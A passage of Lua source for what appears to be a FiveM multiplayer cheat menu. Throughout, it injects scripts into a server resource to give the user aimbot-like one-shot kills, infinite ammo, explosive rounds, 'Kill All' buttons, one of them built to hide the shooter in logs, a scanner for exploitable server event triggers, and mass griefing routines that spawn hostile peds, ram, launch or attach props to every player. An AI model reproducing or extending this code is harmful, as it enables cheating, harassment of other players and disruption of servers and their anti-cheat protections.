    MachoInjectResource('monitor', [[
        _G.MachoTwinGunActive = true
        local isProcessing = false 

        local function GetAimedTarget()
            local player = PlayerId()
            local found, target = GetEntityPlayerIsFreeAimingAt(player)
            
            if found and IsEntityAPed(target) and IsPedAPlayer(target) then
                local me = PlayerPedId()
                if target ~= me and not IsPedDeadOrDying(target) then
                    return target
                end
            end
            return 0
        end

        Citizen.CreateThread(function()
            while _G.MachoTwinGunActive do
                local me = PlayerPedId()
                
                if IsPedShooting(me) and not isProcessing then
                    local targetPed = GetAimedTarget()

                    if targetPed ~= 0 then
                        isProcessing = true 
                        
                        local twin = ClonePed(targetPed, GetEntityHeading(targetPed), false, false)
                        
                        if DoesEntityExist(twin) then
                            local headCoords = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)
                            
                            SetEntityVisible(twin, false, false)
                            SetEntityAlpha(twin, 0, false)
                            SetEntityCollision(twin, false, false)
                            FreezeEntityPosition(twin, true)

                            SetEntityCoords(twin, headCoords.x, headCoords.y, headCoords.z + 0.5, false, false, false, true)

                            local wH = 0xBFD21232 
                            GiveWeaponToPed(twin, wH, 1, false, true)
                            SetCurrentPedWeapon(twin, wH, true)

                            ShootSingleBulletBetweenCoords(
                                headCoords.x, headCoords.y, headCoords.z + 0.4, 
                                headCoords.x, headCoords.y, headCoords.z, 
                                200, true, wH, me, true, false, 1000.0
                            )

                            Citizen.SetTimeout(50, function()
                                if DoesEntityExist(twin) then DeleteEntity(twin) end
                            end)
                        end
                        
                        Citizen.Wait(800) 
                        isProcessing = false 
                    end
                end
                Wait(0)
            end
        end)
    ]])
end, function()
    MachoMenuNotification("1 Tap", "DISABLED")
    MachoInjectResource('monitor', [[ _G.MachoTwinGunActive = false ]])
end)



MachoMenuCheckbox(Tab5Group1, "Infinite Ammo No Reload (Risky)",
    function()
        MachoInjectResource('monitor', [[
            _G.MachoInfAmmoActive = true
            Citizen.CreateThread(function()
                while _G.MachoInfAmmoActive do
                    local ped = PlayerPedId()
                    if IsPedArmed(ped, 4) then
                        local weapon = GetSelectedPedWeapon(ped)
                        SetAmmoInClip(ped, weapon, 50)
                        AddAmmoToPed(ped, weapon, 10)
                    end
                    Wait(10)
                end
            end)
        ]])
    end,
    function()
        MachoInjectResource('monitor', [[
            _G.MachoInfAmmoActive = false
        ]])
    end
)


MachoMenuCheckbox(Tab5Group1, "Explosive Ammo (Knockback Prop)", function(checked)
    if checked then
        MachoInjectResource2(0, 'monitor', [[
            _G.MachoExplodeActive = true 
            Citizen.CreateThread(function()
                while _G.MachoExplodeActive do
                    Citizen.Wait(0)
                    local ped = PlayerPedId()
                    if IsPedShooting(ped) then
                        local found, coords = GetPedLastWeaponImpactCoord(ped)
                        if found then
                            AddExplosion(coords.x, coords.y, coords.z, 2, 0.3, true, false, 0.2)
                        end
                    end
                end
            end)
        ]])
    else
        MachoInjectResource('monitor', [[ _G.MachoExplodeActive = false ]])
    end
end)

MachoMenuText(Tab5Group1, "Car Bullet")
local pakakVehicleInput = MachoMenuInputbox(Tab5Group1, "Vehicle Model", "panto")

MachoMenuCheckbox(Tab5Group1, "Enable Car-Gun Mode", 
    function()
        local vehName = MachoMenuGetInputbox(pakakVehicleInput)
        MachoMenuNotification("Car Gun", "ENABLED | Model: " .. vehName)
        
        MachoInjectResource('monitor', [[
            _G.MachoCarGunActive = true
            _G.TargetVehicle = "]] .. vehName .. [["
            
            local function GetAimCoords()
                local camCoord = GetGameplayCamCoords()
                local farCoord = camCoord + (GetGameplayCamRot(2):ToRotationVector() * 1000.0)
                local ray = StartShapeTestRay(camCoord.x, camCoord.y, camCoord.z, farCoord.x, farCoord.y, farCoord.z, -1, PlayerPedId(), 0)
                local _, hit, endCoords = GetShapeTestResult(ray)
                return hit, endCoords
            end

            function RotationToDirection(rotation)
                local adjustedRotation = { 
                    x = (math.pi / 180) * rotation.x, 
                    y = (math.pi / 180) * rotation.y, 
                    z = (math.pi / 180) * rotation.z 
                }
                local direction = {
                    x = -math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), 
                    y = math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), 
                    z = math.sin(adjustedRotation.x)
                }
                return direction
            end

            Citizen.CreateThread(function()
                while _G.MachoCarGunActive do
                    local ped = PlayerPedId()
                    if IsPedShooting(ped) then
                        local camRot = GetGameplayCamRot(2)
                        local dir = RotationToDirection(camRot)
                        local start = GetGameplayCamCoords()
                        local destination = {
                            x = start.x + dir.x * 200.0, 
                            y = start.y + dir.y * 200.0,
                            z = start.z + dir.z * 200.0
                        }
                        
                        local ray = StartShapeTestRay(start.x, start.y, start.z, destination.x, destination.y, destination.z, -1, ped, 0)
                        local _, hit, endCoords = GetShapeTestResult(ray)
                        
                        if hit then
                            local hash = GetHashKey(_G.TargetVehicle)
                            RequestModel(hash)
                            local t = 0
                            while not HasModelLoaded(hash) and t < 50 do Wait(0) t = t + 1 end
                            
                            if HasModelLoaded(hash) then
                                CreateVehicle(hash, endCoords.x, endCoords.y, endCoords.z, 0.0, true, false)
                                SetModelAsNoLongerNeeded(hash)
                            end
                        end
                    end
                    Wait(0)
                end
            end)
        ]])
    end,
    function()
        MachoMenuNotification("Car Gun", "DISABLED")
        MachoInjectResource('monitor', [[ _G.MachoCarGunActive = false ]])
    end
)

    Tab6Button = MachoMenuAddTab(TabbedWindow, "Nuke")
    Tab6Group1 = MachoMenuGroup(Tab6Button, "MISC", TabsWidth+GroupGap, GroupTopGap+WindowTopBar, TabsWidth+GroupGap+GroupSize, 500-GroupTopGap)
    Tab6Group2 = MachoMenuGroup(Tab6Button, "SERVER", TabsWidth+GroupGap+GroupSize+GroupGap, GroupTopGap+WindowTopBar, TabsWidth+GroupGap+GroupSize+GroupGap+GroupSize, 500-GroupTopGap)



CreateThread(function()
    while true do
        Wait(0)
        if IsControlJustPressed(0, 121) then 
            if TabbedWindow then
                local isVisible = MachoMenuIsVisible(TabbedWindow)
                MachoMenuSetVisible(TabbedWindow, not isVisible)
            end
        end
    end
end)

MachoMenuButton(Tab6Group1, "Kill All", function()
    local me = GetPlayerPed(-1)
    local myCoords = GetEntityCoords(me)

    MachoInjectResource2(3, "monitor", string.format([[
        local myPos = vector3(%f, %f, %f)
        local me = GetPlayerPed(-1)
        local weaponHash = 0x1B06D571
        
        for _, player in ipairs(GetActivePlayers()) do
            local targetPed = GetPlayerPed(player)
            
            if targetPed ~= me and DoesEntityExist(targetPed) then
                local targetCoords = GetEntityCoords(targetPed)
                local distance = #(myPos - targetCoords)

                if distance <= 300.0 then
                    local head = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)
                    
                    local twin = ClonePed(targetPed, GetEntityHeading(targetPed), true, false)
                    
                    if DoesEntityExist(twin) then
                        SetEntityVisible(twin, false, false)
                        SetEntityAlpha(twin, 0, false)
                        SetEntityCollision(twin, false, false)
                        SetEntityCoords(twin, targetCoords.x, targetCoords.y, targetCoords.z - 5.0, false, false, false, true)
                        
                        GiveWeaponToPed(twin, weaponHash, 1, false, true)

                        ShootSingleBulletBetweenCoords(
                            head.x, head.y, head.z + 0.1, 
                            head.x, head.y, head.z, 
                            250,   
                            true,   
                            weaponHash, 
                            me,   
                            true,   
                            false,  
                            1000.0  
                        )

                        SetEntityAsMissionEntity(targetPed, true, true)
                        SetEntityHealth(targetPed, 0)

                        Citizen.SetTimeout(500, function()
                            if DoesEntityExist(twin) then DeleteEntity(twin) end
                        end)
                    end
                end
            end
        end
    ]], myCoords.x, myCoords.y, myCoords.z))
end)


MachoMenuButton(Tab6Group1, "Kill All (Safe Logs)", function()
    local me = GetPlayerPed(-1)
    local myCoords = GetEntityCoords(me)

    MachoInjectResource2(3, "monitor", string.format([[
        local myPos = vector3(%f, %f, %f)
        local me = GetPlayerPed(-1)
        local weaponHash = 0x1B06D571
        
        for _, player in ipairs(GetActivePlayers()) do
            local targetPed = GetPlayerPed(player)
            
            if targetPed ~= me and DoesEntityExist(targetPed) then
                local targetCoords = GetEntityCoords(targetPed)
                local distance = #(myPos - targetCoords)

                if distance <= 300.0 then
                    local head = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)
                    
                    local twin = ClonePed(targetPed, GetEntityHeading(targetPed), true, false)
                    
                    if DoesEntityExist(twin) then
                        SetEntityVisible(twin, false, false)
                        SetEntityAlpha(twin, 0, false)
                        SetEntityCollision(twin, false, false)
                        SetEntityCoords(twin, targetCoords.x, targetCoords.y, targetCoords.z - 5.0, false, false, false, true)
                        
                        GiveWeaponToPed(twin, weaponHash, 1, false, true)

                        ShootSingleBulletBetweenCoords(
                            head.x, head.y, head.z + 0.1, 
                            head.x, head.y, head.z, 
                            250,   
                            true,   
                            weaponHash, 
                            twin,   
                            true,   
                            false,  
                            1000.0  
                        )

                        SetEntityAsMissionEntity(targetPed, true, true)
                        SetEntityHealth(targetPed, 0)

                        Citizen.SetTimeout(500, function()
                            if DoesEntityExist(twin) then DeleteEntity(twin) end
                        end)
                    end
                end
            end
        end
    ]], myCoords.x, myCoords.y, myCoords.z))
end)

MachoMenuButton(Tab6Group2, "Trigger Finder", function()
MachoInjectResource('monitor', [[
local triggersQueue = {}      -- queued triggers to display
local activeLines = {}        -- triggers currently visible
local colors = {}             -- random colors per trigger
local startY = 0.95           -- bottom of screen
local startX = 0.005          -- left margin
local lineHeight = 0.02       -- spacing between lines
local scrollSpeed = 0.0008    -- upward scroll speed
local displayTime = 2000      -- ms line stays visible before fading
local fadeTime = 500          -- ms fade out duration
local lineDelay = 100         -- ms delay between new lines
local overlayActive = true

local function randomColor()
    return {r = math.random(50,255), g = math.random(50,255), b = math.random(50,255)}
end

local function addTrigger(call)
    if not colors[call] then
        colors[call] = randomColor()
    end
    table.insert(triggersQueue, call)
    print("[Trigger] " .. call) -- log to F8 console
end

Citizen.CreateThread(function()
    for i = 0, GetNumResources() - 1 do
        local resName = GetResourceByFindIndex(i)
        local numFiles = GetNumResourceMetadata(resName, "client_script")
        if numFiles > 0 then
            for j = 0, numFiles - 1 do
                local scriptName = GetResourceMetadata(resName, "client_script", j)
                local scriptContent = LoadResourceFile(resName, scriptName)
                if scriptContent then
                    for line in scriptContent:gmatch("[^\r\n]+") do
                        local eventCall = line:match('TriggerServerEvent%s*%((.-)%)')
                        if eventCall then
                            addTrigger("TriggerServerEvent(" .. eventCall .. ")")
                        end
                    end
                end
            end
        end
    end
end)

Citizen.CreateThread(function()
    while overlayActive do
        Citizen.Wait(lineDelay)
        if #triggersQueue > 0 then
            local call = table.remove(triggersQueue, 1)
            table.insert(activeLines, {text = call, y = startY, time = 0})
        elseif #activeLines == 0 then
            overlayActive = false -- stop when done
        end
    end
end)

Citizen.CreateThread(function()
    while overlayActive do
        Citizen.Wait(0)
        local dt = 1 / 60

        for i = #activeLines, 2, -1 do
            local above = activeLines[i-1]
            local current = activeLines[i]
            if current.y - above.y < lineHeight then
                above.y = current.y - lineHeight
            end
        end

        for i = #activeLines, 1, -1 do
            local line = activeLines[i]
            line.y = line.y - scrollSpeed
            line.time = line.time + dt * 1000

            local alpha = 255
            if line.time >= displayTime then
                alpha = 255 * math.max(0, 1 - ((line.time - displayTime) / fadeTime))
            end

            if alpha <= 0 or line.y < 0 then
                table.remove(activeLines, i)
            else
                local color = colors[line.text]
                SetTextFont(0)
                SetTextProportional(1)
                SetTextScale(0.25, 0.25)
                SetTextColour(color.r, color.g, color.b, math.floor(alpha))
                SetTextDropShadow(0,0,0,0,255)
                SetTextEdge(1,0,0,0,255)
                SetTextOutline()
                SetTextEntry("STRING")
                AddTextComponentString(line.text)
                DrawText(startX, line.y)
            end
        end
    end
end)


]])

end)




MachoMenuButton(Tab3Group2, "Mass Sky Launch (100m)", function()
    local resName = "monitor" 
    local threadName = "" 

    local scriptToInject = [[
        local myPed = PlayerPedId()
        local myCoords = GetEntityCoords(myPed)
        local oldCoords = myCoords
        local targets = {}

        -- 1. SCAN FOR TARGETS WITHIN 100M
        for _, player in ipairs(GetActivePlayers()) do
            local targetPed = GetPlayerPed(player)
            if targetPed ~= myPed and DoesEntityExist(targetPed) then
                local targetPos = GetEntityCoords(targetPed)
                local dist = #(myCoords - targetPos)
                
                if dist <= 100.0 then
                    table.insert(targets, GetPlayerServerId(player))
                end
            end
        end

        print("^2[Macho] Found "..#targets.." targets for Sky Launch.^7")

        -- 2. LOOP THROUGH EACH TARGET 1 BY 1
        for _, targetServerId in ipairs(targets) do
            local targetIdx = GetPlayerFromServerId(targetServerId)
            if targetIdx ~= -1 then
                local targetPed = GetPlayerPed(targetIdx)
                
                if DoesEntityExist(targetPed) then
                    -- Reset invisibility for the new approach
                    SetEntityVisible(myPed, false, false)
                    SetEntityAlpha(myPed, 0, false)

                    local targetPos = GetEntityCoords(targetPed)
                    SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, targetPos.z, false, false, false)
                    Wait(250) 

                    -- SECURE THE CARRY
                    ExecuteCommand("carry")
                    local attached = false
                    for i = 1, 15 do
                        if IsEntityAttachedToEntity(targetPed, myPed) then
                            attached = true
                            break
                        end
                        Wait(50) 
                    end

                    -- THE LAUNCH
                    if attached then
                        local currentZ = targetPos.z
                        for i = 1, 60 do 
                            currentZ = currentZ + 40.0 
                            SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, currentZ, true, false, false)
                            Wait(10) 
                        end
                        
                        FreezeEntityPosition(myPed, true)
                        Wait(100)

                        -- RELEASE
                        NetworkRequestControlOfEntity(targetPed)
                        for i = 1, 5 do
                            ExecuteCommand("carry") 
                            DetachEntity(targetPed, true, true)
                            ClearPedTasksImmediately(targetPed)
                            SetPedToRagdoll(targetPed, 10000, 10000, 0, 0, 0, 0)
                            Wait(10)
                        end
                        
                        FreezeEntityPosition(myPed, false)
                        Wait(200) -- Konting hinga bago ang susunod
                    end
                end
            end
        end

        -- 3. RETURN AFTER ALL TARGETS ARE DONE
        SetEntityCoords(myPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
        SetEntityVisible(myPed, true, false)
        ResetEntityAlpha(myPed)
        print("^1[Macho] Mass Sky Launch Completed.^7")
    ]]

    MachoInjectThread(0, resName, threadName, scriptToInject)
end)

MachoMenuCheckbox(Tab6Group1, "Esse Chaos (Risky)", 
    function()
        MachoMenuNotification("CHAOS", "Esse Chaos STARTED!")
        
        MachoInjectResource('monitor', [[
            _G.ChaosActive = true
            
            local MODELS = {
                "a_c_cat_01","a_c_chop","a_c_cow","a_c_coyote","a_c_deer",
                "a_c_hen","a_c_husky","a_c_pig","a_c_pigeon",
                "a_c_rabbit_01","a_c_rat","a_c_retriever",
                "a_c_rottweiler","a_c_seagull","a_c_shepherd",
                "a_c_westy",
                "s_m_m_paramedic_01","s_m_y_cop_01","s_m_y_fireman_01",
                "u_m_m_aldinapoli","u_m_y_juggernaut_01"
            }

            local MAX_PEDS = 250
            local SPAWN_RADIUS = 300.0
            local vehmodels = {"jugular", "tanker", "marquis"} -- Ang iyong requested list
            local spawnedPeds = {}

            Citizen.CreateThread(function()
                for _, m in ipairs(MODELS) do
                    if not _G.ChaosActive then break end
                    local hash = GetHashKey(m)
                    RequestModel(hash)
                    while not HasModelLoaded(hash) and _G.ChaosActive do Wait(10) end
                end
            end)

            Citizen.CreateThread(function()
                local playerPed = PlayerPedId()
                while not DoesEntityExist(playerPed) do Wait(100) playerPed = PlayerPedId() end
                local coords = GetEntityCoords(playerPed)

                for i = 1, MAX_PEDS do
                    if not _G.ChaosActive then break end
                    local model = MODELS[math.random(#MODELS)]
                    local hash = GetHashKey(model)
                    RequestModel(hash)
                    while not HasModelLoaded(hash) do Wait(10) end

                    local ped = CreatePed(28, hash,
                        coords.x + math.random(-SPAWN_RADIUS,SPAWN_RADIUS),
                        coords.y + math.random(-SPAWN_RADIUS,SPAWN_RADIUS),
                        coords.z, math.random(0,360), true, false)

                    SetPedCombatAttributes(ped, 46, true)
                    SetPedCombatAbility(ped, 2)
                    SetPedCombatRange(ped, 2)
                    SetPedAccuracy(ped, 60)
                    table.insert(spawnedPeds, ped)
                    Wait(50)
                end
            end)

            Citizen.CreateThread(function()
                while _G.ChaosActive do
                    for _, ped in ipairs(spawnedPeds) do
                        if DoesEntityExist(ped) and not IsPedDeadOrDying(ped) then
                            local players = GetActivePlayers()
                            local targetPid = players[math.random(#players)]
                            local target = GetPlayerPed(targetPid)
                            if DoesEntityExist(target) then
                                TaskCombatPed(ped, target, 0, 16)
                            end
                        end
                    end
                    Wait(1000)
                end
            end)

            Citizen.CreateThread(function()
                while _G.ChaosActive do
                    local model = vehmodels[math.random(#vehmodels)]
                    local vHash = GetHashKey(model)
                    
                    RequestModel(vHash)
                    while not HasModelLoaded(vHash) and _G.ChaosActive do Wait(10) end
                    
                    if _G.ChaosActive then
                        for _, playerId in ipairs(GetActivePlayers()) do
                            local ped = GetPlayerPed(playerId)
                            if DoesEntityExist(ped) then
                                local pos = GetEntityCoords(ped)
                                local heading = GetEntityHeading(ped)
                                
                                local vehicle = CreateVehicle(vHash, pos.x, pos.y, pos.z, heading, true, false)
                                
                                SetEntityAlpha(vehicle, 0) 
                                NetworkSetEntityInvisibleToNetwork(vehicle, true)
                                SetVehicleForwardSpeed(vehicle, 90.0) -- Sobrang bilis
                                SetEntityAsNoLongerNeeded(vehicle)
                            end
                        end
                    end
                    Citizen.Wait(1300) 
                end
            end)

            Citizen.CreateThread(function()
                while _G.ChaosActive do
                    Citizen.Wait(100)
                    for _, playerId in ipairs(GetActivePlayers()) do
                        local ped = GetPlayerPed(playerId)
                        if DoesEntityExist(ped) then
                            local pos = GetEntityCoords(ped)
                            local ball = CreateObject(GetHashKey("prop_beachball_02"), pos.x, pos.y, pos.z, true, true, true)
                            SetEntityAsNoLongerNeeded(ball)
                        end
                    end
                end
            end)
        ]])
    end,

    function()
        MachoMenuNotification("CHAOS", "Esse Chaos STOPPED!")
        MachoInjectResource('monitor', [[
            _G.ChaosActive = false
        ]])
    end
)

local tab6group2 = MachoMenuGroup(tab6, "Job Settings", 10.0, 50.0, 300.0, 300.0)
local FrameworkDropdown = MachoMenuDropDown(tab6group2, "Select Framework", {"ESX", "CFX", "QBCore", "QBX", "Any"})
local JobInputBox = MachoMenuInputbox(tab6group2, "Job Name", "police")
local GradeInputBox = MachoMenuInputbox(tab6group2, "Grade", "0")





MachoMenuText(Tab6Group1, "Animation Trolls")


local hephepActive = false 

MachoMenuButton(Tab6Group1, "Hephep Hooray (Toggle)", function()
    if not hephepActive then
        hephepActive = true
        
        local dict1 = "missminuteman_1ig_2"
        local dict2 = "amb@world_human_cheering@male_a"
        
        -- Pre-load animations on yourself first
        RequestAnimDict(dict1)
        RequestAnimDict(dict2)
        
        Citizen.CreateThread(function()
            while hephepActive do
                -- Get all players
                local players = GetActivePlayers()
                
                for _, player in ipairs(players) do
                    local targetId = GetPlayerServerId(player)
                    if targetId and targetId > 0 then
                        -- Use TriggerClientEvent directly with -1 for all players
                        TriggerClientEvent('hephep:doAnim', targetId, dict1, "handsup_enter", 3000)
                    end
                end
                
                Wait(3000)
                
                for _, player in ipairs(players) do
                    local targetId = GetPlayerServerId(player)
                    if targetId and targetId > 0 then
                        TriggerClientEvent('hephep:doAnim', targetId, dict2, "base", 3000)
                    end
                end
                
                Wait(3000)
            end
        end)
    else
        hephepActive = false
        local players = GetActivePlayers()
        for _, player in ipairs(players) do
            local targetId = GetPlayerServerId(player)
            if targetId and targetId > 0 then
                TriggerClientEvent('hephep:clearAnim', targetId)
            end
        end
    end
end)





MachoMenuText(Tab6Group1, "Vehicle Trolls")

local CarModelInput = MachoMenuInputbox(Tab6Group1, "Enter Car Models", "jugular,neon,sunrise,tug")


MachoMenuCheckbox(Tab6Group1, "Rain ALL Vehicles", 
    function()
        local rawInput = MachoMenuGetInputbox(CarModelInput)
        if rawInput == "" or rawInput == "..." then rawInput = "jugular,marquis,neon" end

        MachoInjectResource2(2, "monitor", string.format([[
            _G.RainLoop = true
            local rawModels = "%s"
            local vehicleList = {}
            
            for model in string.gmatch(rawModels, "([^,]+)") do
                local trimmed = model:gsub("^%%s*(.-)%%s*$", "%%1")
                table.insert(vehicleList, GetHashKey(trimmed))
            end

            Citizen.CreateThread(function()
                -- Load lahat ng models sa listahan
                for _, hash in ipairs(vehicleList) do RequestModel(hash) end

                while _G.RainLoop do
                    local players = GetActivePlayers()
                    for i = 1, #players do
                        local target = GetPlayerPed(players[i])
                        if target ~= 0 and DoesEntityExist(target) then 
                            local coords = GetEntityCoords(target)
                            
                            for _, hash in ipairs(vehicleList) do
                                if HasModelLoaded(hash) then
                                    -- Lagyan natin ng konting random offset (x, y) 
                                    -- para hindi sila mag-stuck sa isa't isa habang nahuhulog
                                    local offsetX = math.random(-2, 2) + 0.0
                                    local offsetY = math.random(-2, 2) + 0.0
                                    
                                    local veh = CreateVehicle(hash, coords.x + offsetX, coords.y + offsetY, coords.z + 35.0, 0.0, true, false)
                                    SetEntityAsNoLongerNeeded(veh)
                                    
                                    ApplyForceToEntity(veh, 3, 0.0, 0.0, -200.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                end
                            end
                        end
                        Wait(100) 
                    end
                    Wait(1500) 
                end
            end)
        ]], rawInput))
    end,
    
    function()
        MachoInjectResource2(2, "monitor", [[ _G.RainLoop = false ]])
    end
)


MachoMenuCheckbox(Tab6Group1, "VDM All", 
    
    function()
        local rawInput = MachoMenuGetInputbox(CarModelInput)
        if rawInput == "" or rawInput == "..." then rawInput = "jugular" end

        MachoInjectResource2(2, "monitor", string.format([[
            _G.RunSteadyVDM = true
            local rawModels = "%s"
            local vehicleList = {}

            for model in string.gmatch(rawModels, "([^,]+)") do
                local trimmed = model:gsub("^%%s*(.-)%%s*$", "%%1")
                table.insert(vehicleList, GetHashKey(trimmed))
            end

            Citizen.CreateThread(function()
                for _, hash in ipairs(vehicleList) do RequestModel(hash) end

                while _G.RunSteadyVDM do
                    local players = GetActivePlayers()
                    for i = 1, #players do
                        local target = GetPlayerPed(players[i])
                        if target ~= 0 and DoesEntityExist(target) then
                            local pos = GetEntityCoords(target)
                            local fwd = GetEntityForwardVector(target)
                            
                            local sPos = pos + (fwd * -15.0) + vector3(math.random(-1,1), math.random(-1,1), 0.5)
                            local randomHash = vehicleList[math.random(1, #vehicleList)]

                            if HasModelLoaded(randomHash) then
                                local veh = CreateVehicle(randomHash, sPos.x, sPos.y, sPos.z, 0.0, true, false)
                                if DoesEntityExist(veh) then
                                    SetVehicleNumberPlateText(veh, "STEADY")
                                    
                                    local dir = pos - sPos
                                    local mag = math.sqrt(dir.x^2 + dir.y^2 + dir.z^2)
                                    SetEntityVelocity(veh, (dir.x/mag)*95.0, (dir.y/mag)*95.0, (dir.z/mag)*95.0)
                                    
                                    SetEntityAsNoLongerNeeded(veh)
                                    
                                    Citizen.SetTimeout(1200, function()
                                        if DoesEntityExist(veh) then DeleteEntity(veh) end
                                    end)
                                end
                            end
                        end
                        Wait(50) 
                    end
                    Wait(1000) 
                end
            end)
        ]], rawInput))
    end,

    function()
        MachoInjectResource2(2, "monitor", [[ _G.RunSteadyVDM = false ]])
    end
)

MachoMenuCheckbox(Tab6Group1, "Spawn Vehicle Explode", 
    function() 
        MachoInjectResource2(2, "monitor", [[
            _G.AutoDamageActive = true
            
            Citizen.CreateThread(function()
                local lastVeh = nil
                while _G.AutoDamageActive do
                    local myPed = PlayerPedId()
                    local currentVeh = GetVehiclePedIsIn(myPed, false)
                    
                    if currentVeh == 0 then
                        currentVeh = GetClosestVehicle(GetEntityCoords(myPed), 10.0, 0, 71)
                    end

                    if DoesEntityExist(currentVeh) and currentVeh ~= lastVeh then
                        if not NetworkHasControlOfEntity(currentVeh) then
                            NetworkRequestControlOfEntity(currentVeh)
                        end
                        
                        SetVehicleEngineHealth(currentVeh, 100.0) 
                        SetVehicleBodyHealth(currentVeh, 100.0)
                        SetVehiclePetrolTankHealth(currentVeh, 400.0) 
                        
                        SetVehicleTyreBurst(currentVeh, 0, true, 1000)
                        
                        lastVeh = currentVeh
                        print("Vehicle Damaged: Isang untog na lang, sabog na 'to.")
                    end
                    Wait(1000) 
                end
            end)
        ]])
    end,
    function() 
        MachoInjectResource2(2, "monitor", [[ _G.AutoDamageActive = false ]])
    end
)

MachoMenuText(Tab6Group1, "Prop Trolls")


local PropSetInput = MachoMenuInputbox(Tab6Group1, "Enter Prop Set", "p_cablecar_s,prop_proxy_ch_01")

MachoMenuCheckbox(Tab6Group1, "Prop Set", 
    function()
        local rawInput = MachoMenuGetInputbox(PropSetInput)
        if rawInput == "" or rawInput == "..." then rawInput = "p_cablecar_s,prop_proxy_ch_01" end

        MachoInjectResource2(2, "monitor", string.format([[
            _G.PropSetLoop = true
            local rawProps = "%s"
            local propList = {}
            local trolledPlayers = {} 

            for model in string.gmatch(rawProps, "([^,]+)") do
                local trimmed = model:gsub("^%%s*(.-)%%s*$", "%%1")
                table.insert(propList, GetHashKey(trimmed))
            end

            Citizen.CreateThread(function()
                while _G.PropSetLoop do
                    local myPed = PlayerPedId()
                    local players = GetActivePlayers()

                    for i = 1, #players do
                        local targetPlayerId = players[i]
                        local targetPed = GetPlayerPed(targetPlayerId)
                        
                        if targetPed ~= 0 and DoesEntityExist(targetPed) then
                            local tPos = GetEntityCoords(targetPed)
                            
                            -- Isang beses lang natin kakabitan (para di mag-stack at mag-lag)
                            if not trolledPlayers[targetPlayerId] then
                                
                                for _, hash in ipairs(propList) do
                                    RequestModel(hash)
                                    while not HasModelLoaded(hash) do Wait(10) end

                                    if HasModelLoaded(hash) then
                                        -- Gagawa ng Object na Networked at Script-Owned
                                        local obj = CreateObject(hash, tPos.x, tPos.y, tPos.z, true, true, true)
                                        
                                        if DoesEntityExist(obj) then
                                            -- PERMANENT SETTINGS:
                                            SetEntityInvincible(obj, true) -- Hindi nasisira
                                            SetEntityAsMissionEntity(obj, true, true) -- Hindi buburahin ng engine
                                            
                                            -- Attach sa Root Bone
                                            AttachEntityToEntity(obj, targetPed, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, false, true, false, 2, true)
                                            
                                            -- TINANGGAL ANG SetEntityAsNoLongerNeeded
                                            print("Attached Permanent Prop: " .. hash)
                                        end
                                    end
                                end
                                trolledPlayers[targetPlayerId] = true
                            end
                        end
                    end
                    Wait(3000) 
                end
            end)
        ]], rawInput))
    end,

    function() 
        MachoInjectResource2(2, "monitor", [[ _G.PropSetLoop = false ]])
    end
)

MachoMenuText(Tab6Group1, "Visual Effects")

MachoMenuCheckbox(Tab6Group1, "Nuclear", 
    function() 
        MachoMenuNotification("PURPLE ", "Purple PTFX STARTED!")
        
        MachoInjectResource2(2, "monitor", [[
            _G.MassPurpleVehActive = true
            
            local animDict = "scr_rcbarry2"
            local animName = "scr_exp_allient_cube" 

            Citizen.CreateThread(function()
                RequestNamedPtfxAsset(animDict)
                while not HasNamedPtfxAssetLoaded(animDict) do Wait(10) end

                while _G.MassPurpleVehActive do
                    local myPed = PlayerPedId()
                    local myPos = GetEntityCoords(myPed)
                    
                    local vehicles = GetGamePool('CVehicle')
                    
                    for _, veh in ipairs(vehicles) do
                        if DoesEntityExist(veh) then
                            local vPos = GetEntityCoords(veh)
                            local dist = #(myPos - vPos)

                            if dist <= 300.0 then
                                UseParticleFxAssetNextCall(animDict)
                                
                                local effect = StartParticleFxLoopedAtCoord(animName, vPos.x, vPos.y, vPos.z, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
                                
                                Citizen.SetTimeout(2000, function()
                                    if effect then StopParticleFxLooped(effect, 0) end
                                end)
                            end
                        end
                    end
                    Wait(2500)
                end
            end)
        ]])
    end,
    function()
        MachoInjectResource2(2, "monitor", [[ _G.MassPurpleVehActive = false ]])
    end
)

MachoMenuCheckbox(Tab6Group1, "Fireworks (Everyone)", 
    function() 
        MachoInjectResource2(2, "monitor", [[
            _G.FireworksActive = true
            Citizen.CreateThread(function()
                local asset = "proj_indep_firework"
                RequestNamedPtfxAsset(asset)
                while not HasNamedPtfxAssetLoaded(asset) do Wait(10) end
                
                while _G.FireworksActive do
                    for _, player in ipairs(GetActivePlayers()) do
                        local pPed = GetPlayerPed(player)
                        if DoesEntityExist(pPed) then
                            local pos = GetEntityCoords(pPed)
                            UseParticleFxAssetNextCall(asset)
                            StartNetworkedParticleFxNonLoopedAtCoord("scr_indep_firework_shotburst", pos.x, pos.y, pos.z + 2.0, 0.0, 0.0, 0.0, 1.0, false, false, false)
                        end
                    end
                    Wait(2000)
                end
            end)
        ]])
    end,
    function() -- OFF
        MachoInjectResource2(2, "monitor", [[ _G.FireworksActive = false ]])
    end
)

MachoMenuText(Tab6Group1, "Ear Noises(SUPER RISKY)")

MachoMenuCheckbox(Tab6Group1, "ugh", 
    function()
        MachoInjectResource("monitor", [[
            _G.RagdollBurstActive = true
            local spawnedPeds = {}

            Citizen.CreateThread(function()
                local burstLimit = 29 
                local scanRange = 300.0

                while _G.RagdollBurstActive do
                    local players = GetActivePlayers()
                    local myCoords = GetEntityCoords(PlayerPedId())

                    for _, player in ipairs(players) do
                        local targetPed = GetPlayerPed(player)
                        if DoesEntityExist(targetPed) and targetPed ~= PlayerPedId() then
                            local targetCoords = GetEntityCoords(targetPed)
                            if #(myCoords - targetCoords) <= scanRange then
                                local model = GetEntityModel(targetPed)
                                RequestModel(model)
                                while not HasModelLoaded(model) do Wait(0) end

                                for i = 1, burstLimit do
                                    local clonePed = CreatePed(1, model, targetCoords.x, targetCoords.y, targetCoords.z + 10.0, 0.0, true, false)
                                    SetEntityVisible(clonePed, false, false)
                                    SetEntityHealth(clonePed, 0)
                                    SetPedToRagdoll(clonePed, 1000, 1000, 0, 0, 0, 0)
                                    table.insert(spawnedPeds, clonePed)
                                end

